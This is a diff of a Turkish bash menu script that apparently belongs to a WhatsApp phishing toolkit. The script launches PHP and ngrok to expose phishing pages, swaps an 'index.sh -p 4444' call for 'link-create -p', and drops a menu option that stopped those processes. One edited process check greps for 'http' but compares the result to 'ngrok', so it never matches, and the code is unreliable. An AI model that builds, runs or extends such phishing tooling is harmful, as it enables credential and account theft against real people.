@@ -71,7 +71,7 @@ echo
 echo
 echo
 function finish() {
-	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -o ngrok)
+	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -o http)
 	if [[ $kontrol == ngrok ]];then
 		killall ngrok
 		killall php
@@ -190,7 +190,7 @@ if [[ -a saved_info.txt ]];then
 		echo
 		echo
 		sleep 1
-		bash index.sh -bg -p 4444
+		link-create -p
 		echo
 		echo
 		echo
@@ -223,7 +223,7 @@ read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]─�
 if [[ $secim == 1 ]];then
 	cd files
 	bulunan
-	bash index.sh -bg -p 4444
+	link-create -p
 	echo
 	echo
 	echo
@@ -236,32 +236,6 @@ if [[ $secim == 1 ]];then
 	echo
 	echo
 	dongu
-elif [[ $secim == k || $secim == K ]];then
-	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -v index |awk '{print $2}' |wc -l)
-	if [[ $kontrol == 1 ]];then
-		killall php
-		killall ngrok
-		echo
-		echo
-		echo
-		printf "\e[32m[✓] \e[33mPHP & NGROK\e[97m ARKAPLANDAN KAPATILDI"
-		echo
-		echo
-		echo
-		sleep 2
-		bash whatsapp_phishing.sh
-	else
-		echo
-		echo
-		echo
-		printf "\e[31m[*] \e[33mPHP & NGROK\e[97m ARKAPLANDA ÇALIŞMIYOR"
-		echo
-		echo
-		echo
-		sleep 2
-		bash whatsapp_phishing.sh
-		exit
-	fi
 elif [[ $secim == g || $secim == G || $secim == .. ]];then
 	cd ../..
 	bash phishing-attack.sh
